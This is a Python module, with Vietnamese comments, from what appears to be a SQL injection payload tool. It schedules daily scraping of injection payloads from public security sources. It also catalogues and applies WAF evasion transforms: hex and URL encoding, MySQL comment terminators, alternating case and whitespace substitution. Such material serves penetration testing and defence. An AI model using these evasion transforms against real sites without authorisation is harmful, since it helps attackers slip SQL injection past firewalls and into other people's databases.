"""
Updater & Scheduler - Quản lý automatic updates và WAF bypass techniques
"""

import schedule
import threading
import time
from datetime import datetime
from typing import List, Dict, Any
import os
from pathlib import Path

from core.payload_manager import payload_manager
from scrapers import (
    OWASPScraper,
    GitHubScraper,
    PortSwiggerScraper,
    CVEScraper
)


class IntelligenceUpdater:
    """Quản lý automatic updates từ multiple sources"""
    
    def __init__(self):
        self.scrapers = [
            OWASPScraper(),
            GitHubScraper(),
            PortSwiggerScraper(),
            CVEScraper()
        ]
        self.scheduler = schedule.Scheduler()
        self.is_running = False
        self.update_thread = None
    
    def run_full_update(self) -> Dict[str, int]:
        """Chạy full update từ tất cả sources"""
        print("\n" + "="*60)
        print("🔄 BẮT ĐẦU CẬP NHẬT SQL INJECTION DATABASE")
        print("="*60 + "\n")
        
        results = {}
        total_new = 0
        
        for scraper in self.scrapers:
            try:
                print(f"📡 Cào từ {scraper.get_source_name()}...", end=" ", flush=True)
                
                payloads = scraper.scrape()
                
                if payloads:
                    # Thêm payloads vào manager
                    for payload in payloads:
                        if isinstance(payload, dict):
                            category = payload.get('category', 'extracted')
                            payload_manager.add_payload(category, payload)
                    
                    # Thêm source info
                    payload_manager.add_source(scraper.get_source_name())
                    
                    results[scraper.get_source_name()] = len(payloads)
                    total_new += len(payloads)
                    
                    print(f"✅ {len(payloads)} payloads")
                
                else:
                    print("⚠️  Không có dữ liệu")
            
            except Exception as e:
                print(f"❌ Lỗi: {e}")
                results[scraper.get_source_name()] = 0
        
        print("\n" + "="*60)
        print(f"✨ CẬP NHẬT HOÀN TẤT - Tổng: {total_new} payloads mới")
        print("="*60 + "\n")
        
        return results
    
    def schedule_daily_updates(self, hour: int = 2, minute: int = 0):
        """Lên lịch update hàng ngày"""
        time_str = f"{hour:02d}:{minute:02d}"
        
        self.scheduler.every().day.at(time_str).do(self.run_full_update)
        
        print(f"📅 Lên lịch cập nhật hàng ngày lúc {time_str}")
    
    def start_scheduler(self):
        """Khởi động scheduler (chạy background thread)"""
        if self.is_running:
            print("⚠️  Scheduler đã chạy rồi")
            return
        
        self.is_running = True
        self.update_thread = threading.Thread(target=self._scheduler_loop, daemon=True)
        self.update_thread.start()
        
        print("✅ Scheduler started (background)")
    
    def _scheduler_loop(self):
        """Loop chạy scheduler checks"""
        while self.is_running:
            try:
                self.scheduler.run_pending()
                time.sleep(60)  # Check mỗi phút
            except Exception as e:
                print(f"❌ Lỗi scheduler: {e}")
                time.sleep(60)
    
    def stop_scheduler(self):
        """Dừng scheduler"""
        self.is_running = False
        if self.update_thread:
            self.update_thread.join(timeout=5)
        print("⏹️  Scheduler stopped")
    
    def get_status(self) -> Dict[str, Any]:
        """Lấy status của updater"""
        metadata = payload_manager.get_metadata()
        
        return {
            "scheduler_running": self.is_running,
            "last_updated": metadata.get('updated'),
            "total_payloads": metadata.get('total_payloads'),
            "sources": metadata.get('sources', []),
            "scheduled_jobs": len(self.scheduler.jobs)
        }


class WAFBypassIntelligence:
    """Quản lý WAF bypass techniques"""
    
    WAF_BYPASS_TECHNIQUES = {
        "encoding": [
            {
                "name": "URL Encoding",
                "description": "Encode special chars thành %xx format",
                "example": "' -> %27, = -> %3D"
            },
            {
                "name": "Hex Encoding",
                "description": "Encode thành hex (0x...)",
                "example": "SELECT -> 0x53454c454354"
            },
            {
                "name": "Double URL Encoding",
                "description": "URL encode twice",
                "example": "' -> %2527"
            }
        ],
        "comments": [
            {
                "name": "MySQL Comments",
                "description": "Xóa phần còn lại của query",
                "example": "-- -",
                "note": "MySQL có space yêu cầu sau --"
            },
            {
                "name": "Inline Comments",
                "description": "Comments trong query",
                "example": "/*!...*/",
                "note": "MySQL version-check comment"
            }
        ],
        "case_variation": [
            {
                "name": "Case Variation",
                "description": "Mix uppercase/lowercase keywords",
                "example": "SeLeCt, UnIoN, FrOm"
            }
        ],
        "whitespace": [
            {
                "name": "Whitespace Variation",
                "description": "Dùng tab, newline thay cho space",
                "example": "UNION\tSELECT",
                "note": "UNION%09SELECT (tab encoding)"
            },
            {
                "name": "Buffer Overflow",
                "description": "Thêm nhiều spaces/chars phía trước",
                "example": "                    UNION SELECT"
            }
        ]
    }
    
    @classmethod
    def get_all_techniques(cls) -> Dict[str, List[Dict]]:
        """Lấy tất cả WAF bypass techniques"""
        return cls.WAF_BYPASS_TECHNIQUES
    
    @classmethod
    def apply_bypass_technique(cls, payload: str, technique_type: str, technique_name: str) -> str:
        """Áp dụng WAF bypass technique vào payload"""
        
        if technique_type == "encoding":
            if technique_name == "hex_encoding":
                # Encode to hex
                return '0x' + ''.join(f'{ord(c):02x}' for c in payload)
            elif technique_name == "url_encoding":
                from urllib.parse import quote
                return quote(payload, safe='')
        
        elif technique_type == "comments":
            if technique_name == "mysql_comment":
                return payload.rstrip() + "-- -"
            elif technique_name == "inline_comment":
                return "/*!50000" + payload + "*/"
        
        elif technique_type == "case_variation":
            # Mix case
            result = ""
            for i, char in enumerate(payload):
                result += char.upper() if i % 2 == 0 else char.lower()
            return result
        
        elif technique_type == "whitespace":
            if technique_name == "tab_variation":
                return payload.replace(' ', '\t')
            elif technique_name == "newline_variation":
                return payload.replace(' ', '%0a')
        
        return payload


# Global instance
intelligence_updater = IntelligenceUpdater()
